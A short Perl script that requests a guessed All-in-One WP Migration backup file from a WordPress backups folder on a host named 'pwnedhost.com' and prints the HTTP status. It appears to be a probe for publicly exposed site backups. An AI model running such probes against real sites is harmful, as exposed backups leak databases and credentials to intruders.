#!/usr/bin/env perl

use strict;
use warnings;
use feature 'say';

use HTTP::Tiny;

my $Client = HTTP::Tiny->new();

my @payloads = ("pwnedhost.com-wordpress-20220901-061314-k0mgu7.wpress", "putka", "ebe");

my @urls = (
    "http://pwnedhost.com/wordpress/wp-content/ai1wm-backups/$payloads[0]"
);

for my $url (@urls) {
    my $response = $Client->get($url);
    say $url, ": ", $response->{status};
}
